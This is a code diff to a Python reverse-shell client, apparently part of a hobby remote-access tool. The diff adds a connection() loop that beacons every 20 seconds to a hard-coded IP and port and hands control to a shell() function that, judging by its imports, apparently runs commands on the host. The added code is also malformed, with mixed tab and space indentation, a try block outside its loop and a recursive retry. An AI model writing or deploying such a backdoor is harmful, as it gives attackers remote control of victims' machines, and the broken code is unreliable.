@@ -3,8 +3,20 @@ import subprocess
 import json
 import os
 import base64
+import time
 
 
+
+def connection():
+	"""Function that will allow client to connect to server. This Function will attempt to beacon back to the server at specified interval default=20 seconds for testing"""
+    while True:
+        time.sleep(20)
+	try:
+	    sock.connect(("192.168.159.133", 1526))
+	    shell()
+	except:
+	    connection()
+	    
 def send(data):
     """Responsible for sending data"""
     json_data = json.dumps(data)
@@ -73,6 +85,5 @@ def shell():
 
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.connect(("127.0.0.1", 1526))
-
-shell()
+connection()
+sock.close()
